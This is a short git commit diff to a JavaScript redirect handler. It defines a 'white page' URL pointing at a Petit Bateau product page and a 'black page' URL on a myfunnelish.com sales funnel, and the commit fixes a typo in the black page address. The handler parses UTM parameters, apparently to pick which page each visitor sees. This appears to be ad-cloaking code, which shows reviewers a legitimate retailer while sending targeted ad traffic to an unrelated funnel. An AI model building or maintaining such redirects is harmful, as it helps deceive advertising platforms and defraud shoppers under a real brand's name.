66292702272fb929469bf7d94d557dddac32e016
Asif-Moon <asifaslam.ch94@gmail.com>
2025-01-31 00:11:22 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://petitbateau.us/collections/pb-girl/products/ss25-a0cjn";
-    const blackPageURL = "https://https://adffuaorrd.myfunnelish.com/imbassd-1736979042571105-1737989463763779";
+    const blackPageURL = "https://adffuaorrd.myfunnelish.com/imbassd-1736979042571105-1737989463763779";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
